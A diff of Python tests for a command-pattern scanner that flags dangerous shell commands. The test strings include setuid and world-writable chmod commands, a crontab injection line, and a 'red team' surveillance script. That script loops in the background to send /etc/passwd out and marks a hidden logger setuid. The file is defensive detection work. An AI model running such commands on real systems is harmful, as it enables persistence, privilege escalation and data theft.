@@ -217,10 +217,20 @@ class TestCommandPatternScannerDetection:
         assert r.found is True
         assert any(m.pattern_name == "nohup_background" for m in r.matches)
 
-    def test_chmod_executable(self, cmd_scanner: CommandPatternScanner):
-        r = cmd_scanner.scan("chmod +x backdoor.sh")
+    def test_chmod_setuid(self, cmd_scanner: CommandPatternScanner):
+        r = cmd_scanner.scan("chmod u+s /usr/bin/exploit")
         assert r.found is True
-        assert any(m.pattern_name == "chmod_executable" for m in r.matches)
+        assert any(m.pattern_name == "chmod_setuid" for m in r.matches)
+
+    def test_chmod_world_writable(self, cmd_scanner: CommandPatternScanner):
+        r = cmd_scanner.scan("chmod 777 /tmp/shared")
+        assert r.found is True
+        assert any(m.pattern_name == "chmod_world_writable" for m in r.matches)
+
+    def test_chmod_plus_x_not_flagged(self, cmd_scanner: CommandPatternScanner):
+        """chmod +x is normal in code generation and should not be flagged."""
+        r = cmd_scanner.scan("chmod +x deploy.sh")
+        assert r.found is False
 
     def test_crontab_injection(self, cmd_scanner: CommandPatternScanner):
         r = cmd_scanner.scan("echo '* * * * * /tmp/evil' | crontab -")
@@ -250,7 +260,7 @@ class TestCommandPatternScannerDetection:
         assert r.scanner_name == "command_pattern_scanner"
 
     def test_surveillance_script_red_team_5_4(self, cmd_scanner: CommandPatternScanner):
-        """Red team test 5.4 — surveillance script with curl/nohup/chmod."""
+        """Red team test 5.4 — surveillance script with nohup/setuid."""
         payload = (
             "#!/bin/bash\n"
             "nohup bash -c 'while true; do\n"
@@ -258,11 +268,11 @@ class TestCommandPatternScannerDetection:
             "    -d \"$(cat /etc/passwd)\"\n"
             "  sleep 60\n"
             "done' &\n"
-            "chmod +x /tmp/.hidden_logger\n"
+            "chmod 4755 /tmp/.hidden_logger\n"
         )
         r = cmd_scanner.scan(payload)
         assert r.found is True
-        assert len(r.matches) >= 2  # Should catch nohup + chmod at minimum
+        assert len(r.matches) >= 2  # nohup + chmod setuid
 
 
 class TestCommandPatternScannerClean:
